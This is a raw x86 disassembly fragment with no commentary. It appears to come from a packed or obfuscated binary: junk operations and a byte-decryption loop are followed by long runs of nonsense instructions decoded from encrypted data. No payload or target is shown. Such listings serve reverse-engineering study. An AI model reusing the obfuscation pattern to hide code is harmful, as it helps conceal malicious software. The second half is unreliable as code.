  40394b:	mov    DWORD PTR ds:0x426ee1,ecx
  403951:	cmp    DWORD PTR ds:0x426ee1,0x16
  403958:	jae    0x40399f
  40395e:	cmp    DWORD PTR ds:0x426ee1,0xb
  403965:	jge    0x40399f
  40396b:	jmp    0x403980
  403970:	push   0x37fd
  403975:	push   0x426042
  40397a:	call   DWORD PTR ds:0x430a44
  403980:	cmp    DWORD PTR ds:0x426ee1,0xa
  403987:	jne    0x40399a
  40398d:	mov    ecx,DWORD PTR ds:0x426ee1
  403993:	inc    ecx
  403994:	mov    DWORD PTR ds:0x426ee1,ecx
  40399a:	jmp    0x403944
  40399f:	mov    dl,BYTE PTR [eax+ebx*1+0x801]
  4039a6:	mov    eax,DWORD PTR [ebp-0x28]
  4039a9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039ac:	xor    eax,esi
  4039ae:	and    DWORD PTR ds:0x426f09,0x426e85
  4039b8:	xor    ecx,esi
  4039ba:	adc    DWORD PTR ds:0x426e91,0x426ed5
  4039c4:	add    eax,edi
  4039c6:	sbb    DWORD PTR ds:0x426ef1,0x426e99
  4039d0:	add    ecx,edi
  4039d2:	mov    DWORD PTR ds:0x426ed1,0x117e
  4039dc:	mov    BYTE PTR [ebp-0x21],dl
  4039df:	cmp    eax,ecx
  4039e1:	mov    DWORD PTR ds:0x426ea5,0x5630
  4039eb:	jae    0x403af5
  4039f1:	lea    ecx,[eax-0x3272fa]
  4039f7:	and    DWORD PTR ds:0x426e99,0x0
  403a01:	jmp    0x403a13
  403a06:	mov    edx,DWORD PTR ds:0x426e99
  403a0c:	inc    edx
  403a0d:	mov    DWORD PTR ds:0x426e99,edx
  403a13:	cmp    DWORD PTR ds:0x426e99,0x1a
  403a1a:	jae    0x403a48
  403a20:	cmp    DWORD PTR ds:0x426e99,0x24
  403a27:	jle    0x403a48
  403a2d:	jmp    0x403a43
  403a32:	push   DWORD PTR [ebp-0x20]
  403a35:	push   DWORD PTR [ebp-0xc]
  403a38:	push   0x18cc
  403a3d:	call   DWORD PTR ds:0x430a18
  403a43:	jmp    0x403a06
  403a48:	mov    DWORD PTR [ebp-0x14],ecx
  403a4b:	dec    DWORD PTR ds:0x426e89
  403a51:	mov    edx,DWORD PTR [ebp-0x14]
  403a54:	or     DWORD PTR ds:0x426f29,0x426e89
  403a5e:	xor    edx,esi
  403a60:	xor    DWORD PTR ds:0x426ed9,0x426ed5
  403a6a:	add    edx,0x7f55d8fb
  403a70:	lea    ecx,[ebp+eax*4-0xb4]
  403a77:	mov    DWORD PTR ds:0x426e81,0x3e21
  403a81:	mov    DWORD PTR [ecx],edx
  403a83:	mov    DWORD PTR ds:0x426ecd,0x70c2
  403a8d:	mov    edx,DWORD PTR [ecx]
  403a8f:	cmp    edx,0x244ecb9a
  403a95:	jbe    0x403ab0
  403a9b:	add    DWORD PTR ds:0x426edd,0x36b2
  403aa5:	add    DWORD PTR [ecx],0x405fcd9
  403aab:	jmp    0x403ab6
  403ab0:	add    DWORD PTR [ecx],0xfdaf4327
  403ab6:	mov    ecx,DWORD PTR [ebp-0x18]
  403ab9:	xor    ecx,esi
  403abb:	sbb    DWORD PTR ds:0x426f11,0x426ef1
  403ac5:	inc    eax
  403ac6:	inc    DWORD PTR [ebp-0x14]
  403ac9:	sbb    DWORD PTR ds:0x426eb1,0x426ef5
  403ad3:	add    ecx,edi
  403ad5:	mov    DWORD PTR ds:0x426ee5,0x502
  403adf:	cmp    eax,ecx
  403ae1:	jb     0x403a4b
  403ae7:	mov    eax,ds:0x426f1d
  403aec:	xor    DWORD PTR ds:0x426ee9,eax
  403af2:	mov    dl,BYTE PTR [ebp-0x21]
  403af5:	add    eax,DWORD PTR ds:0x426ea1
  403afb:	mov    eax,DWORD PTR [ebp-0x34]
  403afe:	xor    al,0xb3
  403b00:	not    DWORD PTR ds:0x426f0d
  403b06:	mov    cl,0x6
  403b08:	sub    cl,al
  403b0a:	add    dl,cl
  403b0c:	sub    DWORD PTR ds:0x426ed9,0x16fc
  403b16:	mov    ecx,DWORD PTR [ebp-0x1c]
  403b19:	xor    cl,0xb3
  403b1c:	sub    cl,0x6
  403b1f:	ror    dl,cl
  403b21:	xor    eax,eax
  403b23:	or     eax,eax
  403b25:	mov    eax,DWORD PTR [ebp-0xc]
  403b28:	mov    BYTE PTR [eax+ebx*1+0x801],dl
  403b2f:	mov    eax,DWORD PTR [ebp-0xc]
  403b32:	mov    ecx,DWORD PTR [ebp-0x28]
  403b35:	xor    DWORD PTR ds:0x426f11,0x426f09
  403b3f:	sub    eax,edi
  403b41:	xor    DWORD PTR ds:0x426eb5,0x426efd
  403b4b:	xor    eax,esi
  403b4d:	cmp    eax,ecx
  403b4f:	jne    0x403b79
  403b55:	mov    eax,DWORD PTR [ebp-0x8]
  403b58:	mov    ecx,DWORD PTR [ebp-0x10]
  403b5b:	xor    eax,esi
  403b5d:	xor    ecx,esi
  403b5f:	sub    eax,ecx
  403b61:	sub    eax,edi
  403b63:	xor    eax,esi
  403b65:	mov    DWORD PTR [ebp-0x8],eax
  403b68:	mov    eax,DWORD PTR [ebp-0x10]
  403b6b:	xor    eax,esi
  403b6d:	mov    ecx,0xffcd8d87
  403b72:	sub    ecx,eax
  403b74:	jmp    0x403b88
  403b79:	mov    eax,DWORD PTR [ebp-0x10]
  403b7c:	xor    eax,esi
  403b7e:	mov    ecx,0xffcd8d06
  403b83:	sub    ecx,eax
  403b85:	add    ecx,DWORD PTR [ebp-0xc]
  403b88:	mov    DWORD PTR [ebp-0xc],ecx
  403b8b:	mov    eax,DWORD PTR [ebp-0x8]
  403b8e:	cmp    eax,0xf89c85b5
  403b93:	jne    0x40140a
  403b99:	mov    DWORD PTR [ebp-0x34],0xb
  403ba0:	mov    ecx,DWORD PTR [ebp+0x8]
  403ba3:	xor    ecx,esi
  403ba5:	add    ecx,edi
  403ba7:	jmp    0x408537
  403bac:	lea    eax,[ecx+ebx*1]
  403baf:	jmp    0x405f47
  403bb4:	lock and dl,ch
  403bb7:	pop    ebp
  403bb8:	pop    ecx
  403bb9:	ins    BYTE PTR es:[edi],dx
  403bba:	js     0x403bf2
  403bbc:	mov    ds:0x56c4e32d,al
  403bc1:	mov    ebp,0x9cf4a0a1
  403bc6:	jnp    0x403c43
  403bc8:	hlt    
  403bc9:	pushf  
  403bca:	jnp    0x403c47
  403bcc:	lods   al,BYTE PTR ds:[esi]
  403bcd:	mov    ecx,0x58036c3e
  403bd2:	fisttp WORD PTR [esi+edi*4+0x63c70b93]
  403bd9:	call   0x5c1e:0x6f41f6a1
  403be0:	ror    BYTE PTR [edi],cl
  403be2:	mov    ebx,ebx
  403be4:	cwde   
  403be5:	push   cs
  403be6:	jo     0x403bed
  403be8:	push   cs
  403be9:	repnz push 0xe6348c1c
  403bef:	xchg   edi,eax
  403bf0:	adc    ebp,edi
  403bf2:	out    dx,eax
  403bf3:	fmul   st(5),st
  403bf5:	push   0xaf3c9287
  403bfa:	sysenter 
  403bfc:	dec    ebx
  403bfd:	jne    0x403c14
  403bff:	out    0x12,al
  403c01:	stos   BYTE PTR es:[edi],al
  403c02:	mov    cl,0x69
  403c04:	lods   eax,DWORD PTR ds:[esi]
  403c05:	fisttp QWORD PTR [eax-0x30c1ff69]
  403c0b:	inc    edx
  403c0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c0d:	lods   eax,DWORD PTR ds:[esi]
  403c0e:	jb     0x403b91
  403c10:	cs loope 0x403bbd
  403c13:	xchg   esi,eax
  403c14:	(bad)  
  403c15:	pop    ecx
  403c16:	cmc    
  403c17:	pop    ebp
  403c18:	popa   
  403c19:	fucomip st,st(2)
  403c1b:	xlat   BYTE PTR ds:[ebx]
  403c1c:	test   DWORD PTR [edi],0xbee303f0
  403c22:	or     edx,DWORD PTR [edx-0x74]
  403c25:	enter  0x28c8,0x1a
  403c29:	stos   DWORD PTR es:[edi],eax
  403c2a:	mov    eax,gs
  403c2c:	aam    0xdc
  403c2e:	fcom   DWORD PTR [ebp-0x32]
  403c31:	sub    eax,0x8950104b
  403c36:	ja     0x403cae
  403c38:	jne    0x403c3a
  403c3a:	mov    DWORD PTR [edi-0x71],esi
  403c3d:	xchg   ecx,eax
  403c3e:	jae    0x403bf5
  403c40:	mov    es,WORD PTR ds:[ebx-0x1]
  403c44:	mov    ds:0xb277454b,al
  403c49:	xrelease xchg BYTE PTR [edx],ah
  403c4c:	mul    al
  403c4e:	mov    bl,0xd2
  403c50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c51:	cmp    esp,DWORD PTR [ebx-0x754efd02]
  403c57:	mov    edx,0xab3ce588
  403c5c:	shl    DWORD PTR [ebx+eiz*8+0x95a9e09],0x9a
  403c64:	je     0x403c4b
  403c66:	sbb    eax,0x53d44f81
  403c6b:	stc    
  403c6c:	loopne 0x403c3d
  403c6e:	dec    ebx
  403c6f:	mov    bh,0x99
  403c71:	nop
  403c72:	cmp    eax,0xed63e730
  403c77:	loop   0x403c29
  403c79:	ret    0xa716
  403c7c:	push   ebx
  403c7d:	and    esp,esi
  403c7f:	ins    BYTE PTR es:[edi],dx
  403c80:	sbb    eax,0x897f7bf9
  403c85:	mov    bl,BYTE PTR [esi+eiz*1-0x200d092a]
  403c8c:	scas   eax,DWORD PTR es:[edi]
  403c8d:	lods   al,BYTE PTR ds:[esi]
  403c8e:	jmp    0xa8735799
  403c93:	daa    
  403c94:	fbld   TBYTE PTR [ebx+0x47]
  403c97:	or     eax,0xbe4809c8
  403c9c:	fdiv   QWORD PTR [edi+0x7b]
  403c9f:	jge    0x403c5d
  403ca1:	xchg   DWORD PTR [esi+0x27005b97],edi
  403ca7:	cmp    BYTE PTR ds:0xad1439ae,dh
  403cad:	(bad)  
  403cae:	jmp    0x403c84
  403cb0:	add    ebp,0xbbfe1a7b
  403cb6:	add    eax,0x558dca94
  403cbb:	sbb    al,0xb
  403cbd:	int    0x9e
  403cbf:	loope  0x403cf7
  403cc1:	xchg   ecx,eax
  403cc2:	test   eax,0x926c1142
  403cc7:	and    BYTE PTR [esi+0x8],0x74
  403ccb:	xchg   edi,eax
  403ccc:	sbb    al,0xdc
  403cce:	dec    esi
  403ccf:	dec    eax
  403cd0:	outs   dx,BYTE PTR ds:[esi]
  403cd1:	jge    0x403ca7
  403cd3:	rcl    DWORD PTR [esi],cl
  403cd5:	pop    ebx
  403cd6:	scas   al,BYTE PTR es:[edi]
  403cd7:	cmp    BYTE PTR [ebp-0x5160383d],cl
  403cdd:	mov    eax,0x766052aa
  403ce2:	or     al,0x34
  403ce4:	rcr    DWORD PTR [ecx+eiz*2],1
  403ce7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ce8:	sbb    edi,DWORD PTR [ecx]
  403cea:	xor    esp,0x506d23b9
  403cf0:	inc    esi
  403cf1:	inc    esi
  403cf2:	push   ebp
  403cf3:	je     0x403cad
  403cf5:	mov    esp,0x4219533e
  403cfa:	ds push 0x5e
  403cfd:	pusha  
  403cfe:	loope  0x403d30
  403d00:	ret    
  403d01:	retf   0x7061
  403d04:	pop    ds
  403d05:	scas   al,BYTE PTR es:[edi]
  403d06:	adc    eax,DWORD PTR [edx]
  403d08:	adc    DWORD PTR [ebp+0x17eda1d1],0xd49a2b5e
  403d12:	pop    ebx
  403d13:	ins    BYTE PTR es:[edi],dx
  403d14:	and    ch,BYTE PTR [eax-0x7eba3af5]
  403d1a:	push   cs
  403d1b:	pop    eax
  403d1c:	rcr    DWORD PTR [eax+0x5b],1
  403d1f:	xchg   esp,eax
  403d20:	arpl   WORD PTR [ebx+0x27211797],dx
  403d26:	int3   
  403d27:	mov    ds:0x49a0ba3c,al
  403d2c:	bound  eax,QWORD PTR [edi-0x76]
  403d2f:	cmp    dl,BYTE PTR [esi]
  403d31:	xor    DWORD PTR [eax-0x2567e40e],0xf329648
  403d3b:	out    0xb9,eax
  403d3d:	dec    edi
  403d3e:	or     dl,BYTE PTR [edx-0x77488e44]
  403d44:	loopne 0x403dbb
  403d46:	ds dec edi
  403d48:	xlat   BYTE PTR ds:[ebx]
  403d49:	mov    cl,ch
  403d4b:	inc    ecx
  403d4c:	sub    ebx,DWORD PTR [eax+0x48b4fc69]
  403d52:	jne    0x403d60
  403d54:	xlat   BYTE PTR ds:[ebx]
  403d55:	jp     0x403ce5
  403d57:	add    eax,0x755d1b02
  403d5c:	pop    ss
  403d5d:	dec    edi
  403d5e:	xchg   esp,eax
  403d5f:	mov    ah,0xcf
  403d61:	jmp    0x5668:0x26af1619
  403d68:	loop   0x403dd9
  403d6a:	jbe    0x403d75
  403d6c:	clc    
  403d6d:	jp     0x403d43
  403d6f:	dec    esp
  403d70:	dec    ebx
  403d71:	mov    al,0xf3
  403d73:	test   esp,esp
  403d75:	outs   dx,BYTE PTR ds:[esi]
  403d76:	inc    eax
  403d77:	cdq    
  403d78:	add    BYTE PTR [edx],al
  403d7a:	cmp    ebp,eax
  403d7c:	inc    ebp
  403d7d:	jae    0x403d6f
  403d7f:	gs (bad) 
  403d81:	ins    DWORD PTR es:[edi],dx
  403d82:	push   0x3be068ae
  403d87:	pop    eax
  403d88:	(bad)
  403d8b:	xchg   ecx,eax
  403d8c:	pop    ebp
  403d8d:	lods   eax,DWORD PTR ds:[esi]
  403d8e:	push   0xffffff99
  403d90:	inc    ebx
  403d91:	or     eax,0x9a223614
  403d96:	inc    ebp
  403d97:	sub    BYTE PTR [eax+0x3a],dh
  403d9a:	sbb    BYTE PTR [ebp-0x7267c6a1],cl
  403da0:	push   0xc4326f60
  403da5:	inc    eax
  403da6:	and    eax,0x610ca165
  403dab:	in     al,dx
  403dac:	mov    cl,0x21
  403dae:	fld    st(4)
  403db0:	dec    edx
  403db1:	cmp    ah,ch
  403db3:	aad    0xda
  403db5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403db6:	jl     0x403e31
  403db8:	jmp    0xabb2ae16
  403dbd:	in     eax,0x6
  403dbf:	xor    eax,0xc64dc1fe
  403dc4:	loope  0x403d53
  403dc6:	sub    BYTE PTR [ebx+edx*1+0x5caa662e],dl
  403dcd:	mov    eax,ds:0x15f084e6
  403dd2:	cmp    eax,0x8976ff99
  403dd7:	push   edx
  403dd8:	cld    
  403dd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403dda:	mov    DWORD PTR ds:0xe3eafa4a,edx
  403de0:	aas    
  403de1:	int    0x36
  403de3:	mov    edi,0x9f1b94c7
  403de8:	jb     0x403e03
  403dea:	scas   eax,DWORD PTR es:[edi]
  403deb:	push   esp
  403dec:	inc    esi
  403ded:	leave  
  403dee:	lds    esi,FWORD PTR [ebx+0x1eca3eda]
  403df4:	fwait
  403df5:	int    0xee
  403df7:	jmp    0x403e72
  403df9:	into   
  403dfa:	inc    esp
  403dfb:	xchg   edi,eax
  403dfc:	int3   
  403dfd:	sub    esp,DWORD PTR [ecx+0x2f35459]
  403e03:	mov    DWORD PTR [esi+0x2530f3cd],ebp
  403e09:	outs   dx,BYTE PTR ds:[esi]
  403e0a:	or     DWORD PTR [esi],ecx
  403e0c:	sub    edx,esi
  403e0e:	cmp    DWORD PTR [ebx],ebx
  403e10:	jae    0x403daa
  403e12:	push   ds
  403e13:	mov    cl,0x21
  403e15:	jb     0x403e2b
  403e17:	dec    edi
  403e18:	in     al,0x1
  403e1a:	jmpw   0x3b97
  403e1e:	push   esi
  403e1f:	or     DWORD PTR [edx+0xd],esp
  403e22:	pop    esi
  403e23:	or     eax,eax
  403e25:	mov    al,ds:0x5284d65e
  403e2a:	xchg   ecx,eax
  403e2b:	xchg   DWORD PTR [ebx],ecx
  403e2d:	push   0x78
  403e2f:	dec    ecx
  403e30:	inc    esp
  403e31:	cmc    
  403e32:	jmp    0x403e8d
  403e34:	call   0xa6af:0xc7420f85
  403e3b:	or     bh,BYTE PTR [edi]
  403e3d:	cmp    BYTE PTR [ecx],ah
  403e3f:	enter  0x5ecb,0x62
  403e43:	add    DWORD PTR [eax+0x50],ecx
  403e46:	and    al,0xb8
  403e48:	or     DWORD PTR [edx],ecx
  403e4a:	mov    ss,WORD PTR fs:[esi+0x75]
  403e4e:	aaa    
  403e4f:	xchg   DWORD PTR [eax+esi*2-0x726979bc],edi
  403e56:	pop    ss
  403e57:	je     0x403e45
  403e59:	jmp    0x5613:0xa86472a2
  403e60:	or     al,0xae
  403e62:	jmp    0x403e31
  403e64:	mov    ch,0xd6
  403e66:	inc    ebp
  403e67:	cwde   
  403e68:	mov    ebp,0x1e2af60b
  403e6d:	repz imul ebx,DWORD PTR [esp+edx*8-0x21],0x274ecdc4
  403e76:	sub    al,0x89
  403e78:	push   ecx
  403e79:	xchg   esp,eax
  403e7a:	ds call 0x7037:0xc5dc3bd0
  403e82:	xchg   edx,eax
  403e83:	js     0x403e79
  403e85:	repz in al,0x82
  403e88:	je     0x403e86
  403e8a:	sbb    bl,BYTE PTR [eax]
  403e8c:	jge    0x403f0b
  403e8e:	lea    edi,[eax]
  403e90:	(bad)  
  403e91:	sbb    bh,bl
  403e93:	loope  0x403e65
  403e95:	mov    esp,DWORD PTR [edi+0x71e0edbb]
  403e9b:	sub    DWORD PTR [ebx+0x12b0a1c0],0x6fe7c594
  403ea5:	lods   al,BYTE PTR ds:[esi]
  403ea6:	mul    BYTE PTR [esi+0x403acfb3]
  403eac:	pop    DWORD PTR [esi+0x6b]
  403eaf:	out    dx,eax
  403eb0:	popf   
  403eb1:	icebp  
  403eb2:	push   es
  403eb3:	dec    ecx
  403eb4:	push   0x8c37aa95
  403eb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403eba:	sbb    BYTE PTR [eax+0x194d0c86],al
  403ec0:	sahf   
  403ec1:	cmp    DWORD PTR [esi+ebx*8-0x2e],ebx
  403ec5:	mov    al,0x68
  403ec7:	push   0x6bcf3bad
  403ecc:	mov    bl,0x5d
  403ece:	mov    ds:0xb347c7a9,al
  403ed3:	lock pop esp
  403ed5:	mov    ch,0x5a
  403ed7:	cmp    eax,0xda52639f
  403edc:	fisub  DWORD PTR [ebx]
  403ede:	aaa    
  403edf:	jmp    0xaccab66d
  403ee4:	nop
  403ee5:	push   0x73
  403ee7:	push   ss
  403ee8:	xor    DWORD PTR [edi],eax
  403eea:	push   edx
  403eeb:	push   0x4d
  403eed:	adc    eax,0x5ad724e8
  403ef2:	je     0x403ed1
  403ef4:	sahf   
  403ef5:	std    
  403ef6:	mov    bl,0x9c
  403ef8:	stos   BYTE PTR es:[edi],al
  403ef9:	addr16 loop 0x403eec
  403efc:	dec    ecx
  403efd:	es xchg ebp,eax
  403eff:	and    eax,DWORD PTR [esi]
  403f01:	pop    eax
  403f02:	dec    eax
  403f03:	popa   
  403f04:	fbld   TBYTE PTR [bp+si-0x3208]
  403f09:	pop    DWORD PTR [edx-0x5a38b06]
  403f0f:	mov    ds,WORD PTR [ecx+0x3defd491]
  403f15:	sar    DWORD PTR [ecx-0x1d],1
  403f18:	jge    0x403f60
  403f1a:	cmp    eax,0x104c72eb
  403f1f:	jns    0x403f6b
  403f21:	pop    es
  403f22:	xchg   ebx,eax
  403f23:	arpl   WORD PTR [ecx],di
  403f25:	xchg   esi,eax
  403f26:	inc    esi
  403f27:	xchg   esi,eax
  403f28:	push   cs
  403f29:	in     eax,0x5f
  403f2b:	add    eax,0x165e8114
  403f30:	js     0x403f6c
  403f32:	leave  
  403f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f34:	scas   al,BYTE PTR es:[edi]
  403f35:	cmp    al,BYTE PTR fs:[edi+ebx*8-0x3e22f83c]
  403f3d:	adc    edi,DWORD PTR [eax-0x12]
  403f40:	dec    ecx
  403f41:	sub    DWORD PTR [ebp+0x5],edi
  403f44:	mov    dl,0x39
  403f46:	and    dl,bl
  403f48:	aad    0x16
  403f4a:	jb     0x403fa5
  403f4c:	adc    dh,BYTE PTR gs:[ebx+0x3c96d5a8]
  403f53:	aas    
  403f54:	aam    0xec
  403f56:	aam    0x26
  403f58:	test   al,0xf
  403f5a:	pop    ecx
  403f5b:	sti    
  403f5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f5d:	ficomp DWORD PTR [ebx]
  403f5f:	xchg   esi,eax
  403f60:	iret   
  403f61:	ins    DWORD PTR es:[edi],dx
  403f62:	and    bh,bl
  403f64:	inc    esp
  403f65:	pop    edx
  403f66:	xchg   ebx,eax
  403f67:	and    DWORD PTR [ebx+0x840d9b0],esi
  403f6d:	les    esi,FWORD PTR [ecx-0x64]
  403f70:	cmc    
  403f71:	jecxz  0x403f94
  403f73:	push   eax
  403f74:	mov    esp,0x2fd2f7c8
  403f79:	or     al,0x88
  403f7b:	jmp    0x120b1e04
  403f80:	adc    al,0x50
  403f82:	je     0x403fe7
  403f84:	adc    DWORD PTR [ebx-0x15005510],0x1e
  403f8b:	popa   
  403f8c:	xchg   eax,ecx
  403f8e:	pop    esi
  403f8f:	out    0xbe,al
  403f91:	cdq    
  403f92:	dec    ebp
  403f93:	pop    esi
  403f94:	jne    0x403f57
  403f96:	or     eax,0xc3051785
  403f9b:	ret    
  403f9c:	repz int 0x5d
  403f9f:	rcl    BYTE PTR [eax+0x65217a75],cl
  403fa5:	or     bh,BYTE PTR [edi-0x25434d68]
  403fab:	int3   
  403fac:	shl    bl,cl
  403fae:	in     eax,dx
  403faf:	lds    esp,FWORD PTR [ebp-0x4ef3171a]
  403fb5:	pop    esi
  403fb6:	(bad)  
  403fb7:	outs   dx,BYTE PTR ds:[esi]
  403fb8:	add    BYTE PTR [esi-0x23],dl
  403fbb:	fistp  DWORD PTR [ecx+0x3d]
  403fbe:	sbb    DWORD PTR [ebx-0x3dcc65fc],edx
  403fc4:	add    BYTE PTR [esi+ebp*1+0x56807a48],0x82
  403fcc:	jg     0x404002
  403fce:	jo     0x404032
  403fd0:	sub    DWORD PTR [esi+eiz*2-0xd63f1df],ecx
  403fd7:	repz push 0xf91b98df
  403fdd:	bound  ebp,QWORD PTR [esp+edx*1+0x63]
  403fe1:	inc    edx
  403fe2:	xor    bh,0x14
  403fe5:	or     BYTE PTR [esi],al
  403fe7:	xchg   edx,eax
  403fe8:	push   esi
  403fe9:	pop    ebx
  403fea:	cmp    bl,BYTE PTR [esi]
  403fec:	loopne 0x403f76
  403fee:	and    eax,0x1790e0a6
  403ff3:	pop    ebp
  403ff4:	dec    esi
  403ff5:	mov    dl,0xf9
  403ff7:	mov    bh,0x4f
  403ff9:	not    DWORD PTR [eax]
  403ffb:	xchg   ebx,eax
  403ffc:	push   cs
  403ffd:	and    al,0x22
  403fff:	or     DWORD PTR ds:0x4e3c96f3,ebp
  404005:	inc    esi
  404006:	xor    eax,0x4958e775
  40400b:	aas    
  40400c:	mov    ds:0xa9bd69d7,al
  404011:	dec    edi
  404012:	dec    esp
  404013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404014:	jmp    0xa75293c1
  404019:	jb     0x404016
  40401b:	je     0x404009
  40401d:	frstor [eax-0x2bfd95a8]
  404023:	pop    edi
  404024:	cmp    dh,BYTE PTR [ebp+esi*4+0x7aad5b44]
  40402b:	cli    
  40402c:	stos   DWORD PTR es:[edi],eax
  40402d:	xchg   DWORD PTR [esi+0x3a],eax
  404030:	std    
  404031:	pop    es
  404032:	outs   dx,DWORD PTR ds:[esi]
  404033:	sar    BYTE PTR ds:[edx+0x39],0x94
  404038:	sub    BYTE PTR [esi+0x4b],dl
  40403b:	inc    ebp
  40403c:	push   ds
  40403d:	imul   ebx,DWORD PTR [eax+edx*4],0x68
  404041:	enter  0x68ba,0x3f
  404045:	jecxz  0x404035
  404047:	jns    0x403fe7
  404049:	inc    esp
  40404a:	mov    bl,0xc2
  40404c:	push   esi
  40404d:	xor    BYTE PTR [ebx+edx*8],ch
  404050:	sbb    eax,0xd5978711
  404055:	xchg   ecx,eax
  404056:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404057:	dec    eax
  404058:	addr16 jo 0x4040d8
  40405b:	jecxz  0x4040be
  40405d:	cmp    al,0x97
  40405f:	jns    0x404096
  404061:	adc    DWORD PTR [ebx],edi
  404063:	push   eax
  404064:	out    dx,eax
  404065:	jl     0x404021
  404067:	mov    bh,0xc4
  404069:	call   0x289b:0xe5b0c265
  404070:	pop    ecx
  404071:	add    WORD PTR [esi-0x50],sp
  404075:	jmp    0xf116349a
  40407a:	loopne 0x4040df
  40407c:	iret   
  40407d:	data16 jns 0x40406b
  404080:	pop    es
  404081:	ror    bh,1
  404083:	sub    BYTE PTR [edi+0x1cd0de36],0xee
  40408a:	push   ecx
  40408b:	lea    ebx,[ebx+0x19]
  40408e:	sahf   
  40408f:	sub    DWORD PTR [ebp-0x2c],edi
  404092:	adc    BYTE PTR [edi-0x48],al
  404095:	mov    al,0x5a
  404097:	mov    gs,WORD PTR [eax+edx*1]
  40409a:	push   edi
  40409b:	lds    edi,FWORD PTR [edx+0x470d8f07]
  4040a1:	loope  0x4040e0
  4040a3:	addr16 xchg edi,eax
  4040a5:	nop
  4040a6:	cmp    DWORD PTR [edi-0x32],ebx
  4040a9:	sar    DWORD PTR [edi],1
  4040ab:	and    eax,DWORD PTR [ebp-0x7a72bb26]
  4040b1:	xor    eax,0x3ce1d4a2
  4040b6:	in     eax,0x7c
  4040b8:	prefetch BYTE PTR [edi-0x37377c43]
  4040bf:	mov    al,0x97
  4040c1:	xchg   ecx,eax
  4040c2:	sub    BYTE PTR gs:[eiz*8-0x78800c68],bh
  4040ca:	push   ecx
  4040cb:	dec    ebx
  4040cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040cd:	add    DWORD PTR [edi-0x69829656],0xd34c30cb
  4040d7:	hlt    
  4040d8:	mov    ebx,0x140888b0
  4040dd:	sub    eax,0x8535fe81
  4040e2:	or     DWORD PTR [esi-0x1b],0xd70c007a
  4040e9:	cmp    ebx,edx
  4040eb:	mov    edx,0x9cad5084
  4040f0:	dec    eax
  4040f1:	mov    al,ds:0x79a2410b
  4040f6:	aaa    
  4040f7:	pusha  
  4040f8:	push   edx
  4040f9:	and    DWORD PTR [edi+0x3f15ce86],edx
  4040ff:	stos   BYTE PTR es:[edi],al
  404100:	sbb    BYTE PTR [esi],cl
  404102:	out    0xee,eax
  404104:	std    
  404105:	mov    ebx,DWORD PTR [ebx]
  404107:	cmp    esi,DWORD PTR ds:0x5621b73f
  40410d:	sub    eax,0xdfabba0a
  404112:	stc    
  404113:	ins    DWORD PTR es:[edi],dx
  404114:	pop    ecx
  404115:	and    eax,0xbf35a082
  40411a:	sub    eax,0xfbb59bcf
  40411f:	mov    cl,0x41
  404121:	adc    BYTE PTR ds:0xcf33f745,ah
  404127:	dec    ebp
  404128:	mov    al,BYTE PTR [ecx-0x5e]
  40412b:	push   edi
  40412c:	ficomp DWORD PTR [ebx+0x39df153a]
  404132:	leave  
  404133:	icebp  
  404134:	push   edx
  404135:	or     esp,DWORD PTR [ecx-0x14f7f1ba]
  40413b:	mov    esp,0xf805e85e
  404140:	xchg   esp,eax
  404141:	in     eax,0xd7
  404143:	jnp    0x40412a
  404145:	outs   dx,BYTE PTR ds:[esi]
  404146:	xor    BYTE PTR [ecx-0x6c],0xf3
  40414a:	fnstenv [edx-0x6]
  40414d:	imul   BYTE PTR [edx-0x67c67fc4]
  404153:	mov    edi,0xa04ed165
  404158:	ror    esi,0xcf
  40415b:	out    0x3e,eax
  40415d:	arpl   WORD PTR [esi+0x3f41b797],dx
  404163:	add    ah,bh
  404165:	adc    al,0x34
  404167:	fs push ecx
  404169:	and    eax,0xfc33d020
  40416e:	push   0x62
  404170:	and    DWORD PTR [ecx-0x63bc724b],ecx
  404176:	aad    0x87
  404178:	enter  0xd04f,0x39
  40417c:	in     al,0x11
  40417e:	in     eax,dx
  40417f:	je     0x40417a
  404181:	add    DWORD PTR [edx-0x11],esi
  404184:	call   0xa111e77c
  404189:	pop    ds
  40418a:	adc    ecx,DWORD PTR [edx+edi*1-0x1479b64d]
  404191:	jno    0x404204
  404193:	js     0x404126
  404195:	sub    al,0x14
  404197:	jg     0x404139
  404199:	sbb    BYTE PTR ds:0xdff6f4b9,0xaf
  4041a0:	sbb    al,0x80
  4041a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041a3:	pop    esp
  4041a4:	inc    esi
  4041a5:	and    BYTE PTR [edi-0x68685db6],al
  4041ab:	iret   
  4041ac:	(bad)  
  4041ae:	fwait
  4041af:	call   0x4c73b81d
  4041b4:	out    dx,eax
  4041b5:	into   
  4041b6:	in     al,0xa7
  4041b8:	adc    eax,0x5da42ffa
  4041bd:	jg     0x404177
  4041bf:	jae    0x4041e0
  4041c1:	cdq    
  4041c2:	sbb    eax,0x33291c96
  4041c7:	retf   
  4041c8:	outs   dx,DWORD PTR ds:[esi]
  4041c9:	mov    bl,0xb2
  4041cb:	pop    edx
  4041cc:	push   edx
  4041cd:	dec    eax
  4041ce:	dec    ecx
  4041cf:	xchg   ax,ax
  4041d1:	loopne 0x4041f7
  4041d3:	out    0x7b,al
  4041d5:	or     BYTE PTR [ecx],dh
  4041d7:	shl    BYTE PTR [eax+0x7a856fea],0x6
  4041de:	pop    ss
  4041df:	fld    DWORD PTR [ecx]
  4041e1:	repz cmp DWORD PTR [eax],0xffffffe6
  4041e5:	pop    esp
  4041e6:	sti    
  4041e7:	jg     0x4041a4
  4041e9:	xchg   dl,bl
  4041eb:	mov    dl,0xc3
  4041ed:	aaa    
  4041ee:	fnstenv [ebp-0x6f3d573e]
  4041f4:	dec    edi
  4041f5:	cmp    ebp,ecx
  4041f7:	sbb    BYTE PTR [ebx-0x6814af3b],cl
  4041fd:	and    al,0xde
  4041ff:	ret    0x30db
